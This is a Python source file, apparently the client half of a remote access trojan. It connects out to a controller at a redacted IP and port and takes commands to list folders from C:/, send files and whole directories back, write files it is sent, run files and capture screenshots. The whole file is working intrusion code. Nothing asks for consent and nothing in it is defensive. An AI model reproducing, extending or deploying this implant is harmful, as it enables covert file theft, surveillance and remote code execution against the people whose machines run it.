import socket
import os
import time
import mss.tools


# Adresse et port du serveur
server_address = ("[IP]", [PORT])
start_folder = "C:/"
current_folder = start_folder
last_folder = [current_folder]


def Refresh(current_folder):
    folders = []
    files = []
    for folder in os.listdir(current_folder):  # Parcourir tous les fichiers dans le dossier actuel
        if os.path.isdir(os.path.join(current_folder, folder)):
            callback = f"📁 {folder}"
            folders.append(callback)
        else:
            callback = f"📝 {folder}"
            files.append(callback)
    for folder in folders:
        sock.sendall(folder.encode())
        time.sleep(0.05)
    for file in files:
        sock.sendall(file.encode())
        time.sleep(0.05)
    sock.sendall("end".encode())


def Goto(current_folder, folder):
    path = os.path.join(current_folder, folder)
    if not os.path.isdir(path):
        sock.sendall('Folder does not exist'.encode())
        time.sleep(0.05)
        sock.sendall('end'.encode())
        return current_folder
    last_folder.append(current_folder)
    current_folder = path
    Refresh(current_folder)
    return current_folder


def Back(current_folder):
    if len(last_folder) == 0:
        sock.sendall("Can't go back anymore!".encode())
        time.sleep(1.5)
        Refresh(current_folder)
        return current_folder
    current_folder = last_folder[-1]
    last_folder.remove(last_folder[-1])
    Refresh(current_folder)
    return current_folder


def Download(current_folder, args):
    file = os.path.join(current_folder, args)
    if os.path.isdir(file):
        for dossier_actuel, sous_dossiers, fichiers in os.walk(file):
            # Parcourir tous les fichiers dans le dossier actuel
            sock.sendall(f"fold".encode())
            time.sleep(0.05)
            print(os.path.relpath(dossier_actuel,current_folder))
            sock.sendall(f"{os.path.relpath(dossier_actuel,current_folder)}".encode())
            time.sleep(0.05)
            for fichier in fichiers:
                # Extraire le chemin complet du fichier
                chemin_fichier = os.path.join(dossier_actuel, fichier)
                chemin_destination = os.path.join(os.path.relpath(dossier_actuel,current_folder), fichier)
                sock.sendall(f"file".encode())
                time.sleep(0.05)
                sock.sendall(f"{chemin_destination}".encode())
                time.sleep(0.05)
                with open(chemin_fichier, "rb") as f:
                    data = f.read(1024)
                    while data:
                        sock.sendall(data)
                        data = f.read(1024)
                    time.sleep(0.05)
                    sock.sendall("end".encode())
                    time.sleep(0.05)
        time.sleep(0.05)
        sock.sendall('end'.encode())
    elif os.path.isfile(file):
        sock.sendall(f"file".encode())
        time.sleep(0.05)
        sock.sendall(f"{args}".encode())
        with open(file, "rb") as f:
            data = f.read(1024)
            while data:
                sock.sendall(data)
                data = f.read(1024)
            time.sleep(0.05)
            sock.sendall("end".encode())
            time.sleep(0.05)
        time.sleep(0.05)
        sock.sendall('end'.encode())
    print(file,args)
    sock.sendall('error'.encode())


def Path(current_folder, args):
    if os.path.isdir(args):
        last_folder.append(current_folder)
        current_folder = args
        sock.sendall("end".encode())
    elif os.path.isdir(os.path.join(current_folder,args)):
        last_folder.append(current_folder)
        current_folder = os.path.join(current_folder,args)
        sock.sendall("end".encode())
    else:
        sock.sendall("Folder does not exist".encode())
    return current_folder

def Upload(current_folder):
    while True:
        callback = sock.recv(1024).decode()
        if callback == 'end':
            return
        if callback == 'fold':
            path = sock.recv(1024).decode()
            print("fold",path)
            os.mkdir(os.path.join(current_folder,path))
        elif callback == 'error':
            print('file does not exist')
        elif callback == 'file':
            path = sock.recv(1024).decode()
            print("file",path)
            with open(os.path.join(current_folder,path),"wb") as f:
                while True:
                    data = sock.recv(1024)
                    try:
                        if data.decode() == 'end':
                            break
                    except:
                        pass
                    f.write(data)


def Execute(current_folder):
    file = os.path.join(current_folder,sock.recv(1024).decode())
    if os.path.isfile(file):
        os.system(f"start {file}")
        sock.sendall("file successfully executed".encode())
        return
    sock.sendall("File does not exist")


def Screen(current_folder):
    with mss.mss() as sct:
        # Get information about each monitor
        monitor = sct.monitors[0]
        # Convert the indices of the monitor dictionary from string to integer
        x, y, w, h = monitor["left"], monitor["top"], monitor["width"], monitor["height"]

        # Capture the monitor image
        sct_img = sct.grab({"left": x, "top": y, "width": w, "height": h})

        # Save the captured image
        filename = "monitor.png"
        mss.tools.to_png(sct_img.rgb, sct_img.size, output=os.path.join(filename))
    sct.close()
    time.sleep(0.5)
    Download("",'monitor.png')
    os.remove("monitor.png")

# Crée un socket pour écouter les connexions entrantes
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(server_address)
    while True:
        command = sock.recv(1024).decode()
        if command == "refresh":
            Refresh(current_folder)
        elif command == "goto":
            args = sock.recv(1024).decode()
            current_folder = Goto(current_folder, args)
        elif command == "back":
            current_folder = Back(current_folder)
        elif command == "download":
            args = sock.recv(1024).decode()
            Download(current_folder, args)
        elif command == "path":
            args = sock.recv(1024).decode()
            current_folder = Path(current_folder, args)
        elif command == "upload":
            Upload(current_folder)
        elif command == "execute":
            Execute(current_folder)
        elif command == "screen":
            Screen(current_folder)


sock.close()
